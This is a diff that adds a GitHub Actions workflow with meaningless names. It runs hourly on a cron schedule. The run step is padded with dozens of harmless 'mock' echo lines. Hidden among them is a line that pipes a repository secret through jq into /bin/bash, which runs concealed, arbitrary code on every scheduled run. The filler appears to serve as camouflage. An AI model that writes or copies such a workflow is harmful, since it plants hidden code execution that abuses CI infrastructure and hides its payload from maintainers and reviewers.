@@ -1,0 +1,49 @@
+name: xiaonaihong2374
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaonaihong2374
+        env:
+          y2193: ${{ secrets.y2193 }}
+        run: |
+          [ -z "$RANDOM" ] || echo "Random var set"
+          for i in {1..3}; do echo "Iter $i"; done
+          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
+          echo $y2193 | jq -r .s11835 | /bin/bash
+          echo "Job control: sleep 0.01 & wait"
+          echo "Systemctl mock: systemctl --version 2>/dev/null | head -1 || echo no-systemctl"
+          echo "Dir: $(pwd)"
+          [ -f /etc/hosts ] && echo "Hosts exist" || true
+          echo "Travis mock: travis --version 2>/dev/null | head -1 || echo no-travis"
+          echo "Exit mock: exit 0 2>/dev/null || true"
+          echo "Chgrp mock: chgrp $USER /tmp 2>/dev/null || true"
+          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
+          echo "Iostat mock: iostat 2>/dev/null | head -1 || echo no-iostat"
+          echo "Kustomize mock: kustomize --version 2>/dev/null | head -1 || echo no-kustomize"
+          echo "Gdb mock: gdb --version 2>/dev/null | head -1 || echo no-gdb"
+          echo "Qemu mock: qemu-system-x86_64 --version 2>/dev/null | head -1 || echo no-qemu"
+          
+          echo "Docker-machine mock: docker-machine --version 2>/dev/null | head -1 || echo no-docker-machine"
+          echo "Nm mock: nm --version 2>/dev/null | head -1 || echo no-nm"
+          echo "Glob test: echo *.sh 2>/dev/null || echo no-sh"
+          echo "Command count: echo \$(ls | wc -l 2>/dev/null || echo 0)"
+          find . -name "*.xml" | xargs -I fname cp fname tmp.tmp.tmp.tmp
+          echo "BC mock: echo '2+2' | bc 2>/dev/null || echo no-bc"
+          echo "Ps mock: ps aux | head -1 2>/dev/null || echo no-ps"
+          echo "Cp mock: cp /etc/hosts /tmp 2>/dev/null || true"
+          echo "IO redirect: echo > file 2>/dev/null || true"
+          echo "Command fail safe: false || echo 'Safe'"
+          echo "Git mock: git --version 2>/dev/null | head -1 || echo no-git"
+          echo "Bitbake mock: bitbake --version 2>/dev/null | head -1 || echo no-bitbake"
+          echo "Tail mock: tail -1 /etc/hosts 2>/dev/null || echo no-tail"
+          test -d /tmp && echo "Tmp dir exists"
+          echo "Bit ops: $(( 1 & 1 ))"
+          echo "Find -exec mock: find /tmp -exec echo {} \\; 2>/dev/null | head -1 || echo no-find-exec"
